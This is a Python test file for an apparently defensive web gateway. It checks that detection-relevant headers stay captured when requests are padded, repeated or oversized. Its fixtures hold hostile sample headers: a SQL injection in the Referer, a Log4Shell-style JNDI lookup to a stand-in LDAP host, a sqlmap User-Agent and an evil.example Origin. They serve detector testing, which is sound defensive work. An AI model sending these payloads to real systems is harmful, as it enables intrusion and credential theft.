"""Header capture under padding / repetition (audit #140): what the upstream receives must stay visible."""

from __future__ import annotations

from typing import Any

from gate_helpers import FakeServer, GateFactory, Upstream, asgi_call, events_of, http_scope

from tokiwa.config import Settings
from tokiwa.deception.provenance import decisive_canary_hit, induced_by
from tokiwa.detect.web_common import INJECTABLE_HEADERS, MAX_HEADERS, build_view
from tokiwa.gate.capture import (
    MAX_CAPTURED_HEADERS,
    MAX_JOINED_HEADER_CHARS,
    MAX_ORDER_REPEATS,
    PRIORITY_HEADERS,
    EventBuilder,
    Exchange,
    capture_headers,
)
from tokiwa.schemas.events import Event

PADDING = [(f"X-Pad-{i}".encode(), b"v") for i in range(70)]
ATTACK = [
    (b"Host", b"shop.example"),
    (b"User-Agent", b"sqlmap/1.8.2#stable (https://sqlmap.org)"),
    (b"Referer", b"https://shop.example/?q=1' UNION SELECT password FROM users--"),
    (b"Sec-Fetch-Site", b"cross-site"),
    (b"Sec-Fetch-Dest", b"image"),
    (b"Sec-Fetch-Mode", b"no-cors"),
    (b"Origin", b"https://evil.example"),
    (b"X-Debug-Auth", b"dbg_canaryvalue123"),
    (b"X-Api-Version", b"${jndi:ldap://x.example/a}"),
]


def _event(settings: Settings, raw: list[tuple[bytes, bytes]], **builder: Any) -> tuple[Event, Exchange]:
    b = EventBuilder(sensor_id="g", capture_body_bytes=64, redaction=settings.llm.redaction, **builder)
    ex = Exchange(
        method="GET",
        scheme="https",
        path="/products",
        query="",
        raw_headers=raw,
        client_ip="203.0.113.9",
        client_port=40000,
    )
    ex.status = 200
    (event,) = b.build(ex)
    return event, ex


def test_priority_set_covers_detector_headers_and_leaves_room() -> None:
    """Drift guard: the web detectors' by-name payload carriers must never be crowded out by padding."""
    assert INJECTABLE_HEADERS <= PRIORITY_HEADERS
    assert len(PRIORITY_HEADERS) + 1 < MAX_CAPTURED_HEADERS  # + the canary header
    assert MAX_CAPTURED_HEADERS <= MAX_HEADERS  # web_common inspects the first MAX_HEADERS entries


def test_padding_in_front_does_not_hide_priority_headers(settings: Settings) -> None:
    event, _ = _event(settings, PADDING + ATTACK, priority_headers=("X-Debug-Auth",))
    http = event.http
    assert http is not None
    assert http.user_agent is not None and http.user_agent.startswith("sqlmap/")
    assert http.referrer is not None and "UNION SELECT" in http.referrer
    for name in (
        "sec-fetch-site",
        "sec-fetch-dest",
        "sec-fetch-mode",
        "origin",
        "x-debug-auth",
        "x-api-version",
    ):
        assert name in http.headers, name
    assert len(http.headers) <= MAX_CAPTURED_HEADERS
    # arrival order is kept: the pads that fit come first, the priority headers after them
    assert http.header_order[0] == "x-pad-0" and http.header_order[-1] == "x-api-version"
    assert "gate:headers_truncated" in event.tags
    assert event.labels["gate.header_count"] == str(len(PADDING) + len(ATTACK))
    kept_pads = sum(1 for k in http.headers if k.startswith("x-pad-"))
    assert event.labels["gate.headers_dropped"] == str(len(PADDING) - kept_pads)


def test_padding_cannot_disable_provenance_or_canary_follow(settings: Settings) -> None:
    """deception provenance and the respond auto-approval guard read Sec-Fetch-* / Origin from the event."""
    event, _ = _event(settings, PADDING + ATTACK, priority_headers=("X-Debug-Auth",))
    stored = Event.model_validate(event.model_dump(mode="json"))  # what respond re-reads from the DB
    reasons = induced_by(stored)
    assert "sec-fetch-site=cross-site" in reasons and "sec-fetch-dest=image" in reasons
    assert any(r.startswith("origin=") for r in reasons)

    deliberate = [(k, v) for k, v in ATTACK if not k.startswith((b"Sec-Fetch", b"Origin"))]
    follow, _ = _event(settings, PADDING + deliberate, priority_headers=("X-Debug-Auth",))
    assert follow.http is not None and follow.http.headers["x-debug-auth"] == "dbg_canaryvalue123"
    assert induced_by(follow) == []
    assert decisive_canary_hit(follow)  # no index built in this test: the header itself decides


def test_web_view_sees_payload_headers_after_padding(settings: Settings) -> None:
    event, _ = _event(settings, PADDING + ATTACK)
    view = build_view(event)
    assert view is not None
    assert view.headers.get("x-api-version", "").startswith("${jndi:")
    assert any(t.param == "referer" and "union select" in t.lower for t in view.targets)


def test_no_padding_no_marks(settings: Settings) -> None:
    event, _ = _event(settings, ATTACK)
    assert "gate:headers_truncated" not in event.tags and "gate:duplicate_header" not in event.tags
    assert "gate.header_count" not in event.labels


def test_duplicate_singletons_are_marked_and_joined(settings: Settings) -> None:
    raw = [(b"Host", b"shop.example"), (b"User-Agent", b"Mozilla/5.0"), (b"Host", b"admin.internal")]
    raw += [(b"user-agent", b"sqlmap/1.8"), (b"Accept", b"a"), (b"accept", b"b")]
    event, _ = _event(settings, raw)
    http = event.http
    assert http is not None
    assert http.headers["host"] == "shop.example, admin.internal"
    assert http.user_agent == "Mozilla/5.0, sqlmap/1.8"
    assert "gate:duplicate_header" in event.tags
    assert event.labels["gate.duplicate_headers"] == "host,user-agent"  # accept is a list: not an anomaly


def test_repeated_header_is_bounded() -> None:
    raw = [(b"Host", b"x")] + [(b"X-Rep", b"A" * 100)] * 1000 + [(b"User-Agent", b"ua")]
    cap = capture_headers(raw)
    assert len(cap.headers["x-rep"]) == MAX_JOINED_HEADER_CHARS
    assert cap.order.count("x-rep") == MAX_ORDER_REPEATS
    assert cap.headers["user-agent"] == "ua" and cap.order[-1] == "user-agent"
    assert cap.clipped == 1 and cap.dropped == 0 and cap.truncated and cap.total == 1002


async def test_gate_answers_431_above_max_request_headers(
    make_gate: GateFactory, upstream: Upstream, fake_server: FakeServer
) -> None:
    app, gate = await make_gate(max_request_headers=50)
    many = [(b"host", b"shop.example")] + [(f"x-pad-{i}".encode(), b"v") for i in range(60)]
    sent = await asgi_call(app, http_scope("/products", b"/products", headers=many))
    assert sent[0]["status"] == 431
    assert upstream.requests == []  # never forwarded
    few = [(b"host", b"shop.example"), (b"user-agent", b"ok")]
    sent = await asgi_call(app, http_scope("/products", b"/products", headers=few))
    assert sent[0]["status"] == 200
    first, second = await events_of(gate, fake_server)
    assert "gate:too_many_headers" in first["tags"] and first["labels"]["gate.action"] == "too_many_headers"
    assert first["http"]["status"] == 431
    assert second["labels"]["gate.action"] == "proxy"


async def test_gate_header_limit_can_be_disabled(make_gate: GateFactory, upstream: Upstream) -> None:
    app, _ = await make_gate(max_request_headers=0)
    many = [(b"host", b"shop.example")] + [(f"x-pad-{i}".encode(), b"v") for i in range(150)]
    sent = await asgi_call(app, http_scope("/products", b"/products", headers=many))
    assert sent[0]["status"] == 200 and len(upstream.requests) == 1


async def test_gate_prioritizes_the_configured_canary_header(
    make_gate: GateFactory, fake_server: FakeServer, settings: Settings
) -> None:
    app, gate = await make_gate(max_request_headers=0)
    name = settings.deception.canary_header.lower().encode()
    raw = [(b"host", b"shop.example")] + [(f"x-pad-{i}".encode(), b"v") for i in range(80)]
    await asgi_call(app, http_scope("/", b"/", headers=[*raw, (name, b"dbg_x")]))
    (event,) = await events_of(gate, fake_server)
    assert event["http"]["headers"][name.decode()] == "dbg_x"
